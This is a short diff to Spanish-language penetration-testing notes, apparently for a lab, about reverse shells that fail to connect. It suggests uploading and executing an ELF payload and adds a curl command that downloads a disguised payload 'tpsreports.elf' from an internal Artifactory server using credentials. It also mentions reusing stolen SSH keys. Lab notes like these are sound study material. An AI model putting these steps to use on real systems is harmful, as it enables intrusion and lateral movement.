@@ -498,6 +498,12 @@ TODO: revisar porque no se obtiene la shell
 > - **Arquitectura del payload**: verifica que `-p linux/x64/...` coincide con la arquitectura del objetivo (`uname -m`).
 > - **Alternativa fiable**: sube un ELF con `-f elf`, dale permisos y ejecútalo desde una ruta ejecutable en vez de `| bash`. Genera variantes desde [[Shells]] / [[Payloads]].
 
+**Artifactory Upload**
+
+```bash
+$ curl -u ART_USER:ART_PWD -o tpsreports.elf "http://192.168.140.173:8082/artifactory/generic-local/tpsreports.elf"
+```
+
 ### Related notes
 - [[Lateral Movement with SSH]] — reutilizar claves/credenciales robadas del controlador
 - [[Linux Enumeration]] — detectar Ansible/Artifactory tras el foothold
